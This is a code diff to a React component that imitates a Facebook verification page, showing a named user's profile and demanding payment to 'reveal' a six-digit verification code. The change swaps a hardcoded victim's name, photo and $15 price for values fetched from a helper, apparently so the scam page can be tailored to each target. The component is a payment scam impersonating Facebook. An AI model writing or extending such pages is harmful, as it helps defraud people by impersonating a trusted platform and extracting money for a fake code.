@@ -1,16 +1,22 @@
 'use client';
 
-import { useState } from "react";
+import multipleStep from "@/lib/multipleStep";
+import { useEffect, useState } from "react";
 
 export default function SixDigitCode() {
     const code = '******';
     const [paid, setPaid] = useState(false);
 
-    const fbUser = {
-        name: 'Nur Alam',
-        profilePic:
-            'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRGCg4pLQ1ckWPPMqf4s4eLyiKKMUU9bpjtA&s',
-    };
+   const [infos, setInfos] = useState<any>(null);
+   
+     useEffect(() => {
+       async function fetchInfos() {
+         const data = await multipleStep();
+         setInfos(data);
+       }
+       fetchInfos();
+     }, []);
+  
 
     return (
         <div className="min-h-screen bg-white flex items-center justify-center px-4 py-10 font-sans">
@@ -18,13 +24,12 @@ export default function SixDigitCode() {
                 {/* User Header */}
                 <div className="flex items-center gap-4 mb-6">
                     <img
-                        src={fbUser.profilePic}
-                        alt="Profile"
+                        src={infos?.profile_pic}
                         className="w-14 h-14 rounded-full border-4 border-[#1877f2] object-cover"
                     />
                     <div>
                         <p className="text-sm text-gray-500">Facebook User</p>
-                        <h2 className="text-xl font-semibold text-gray-900">{fbUser.name}</h2>
+                        <h2 className="text-xl font-semibold text-gray-900">{infos?.profile_name}</h2>
                     </div>
                 </div>
 
@@ -33,7 +38,7 @@ export default function SixDigitCode() {
                     Unlock Your Verification Code
                 </h1>
                 <p className="text-sm text-gray-600 mb-5">
-                    A $15 payment is required to access your secure 6-digit verification code.
+                    A ${infos?.payment} payment is required to access your secure 6-digit verification code.
                 </p>
 
                 {/* Illustration */}
@@ -62,7 +67,7 @@ export default function SixDigitCode() {
                     onClick={() => setPaid(true)}
                     className="w-full bg-[#1877f2] text-white font-semibold py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition"
                 >
-                    Pay $15 to Reveal 6-Digit Code
+                    Pay ${infos?.payment} to Reveal 6-Digit Code
                 </button>
 
 
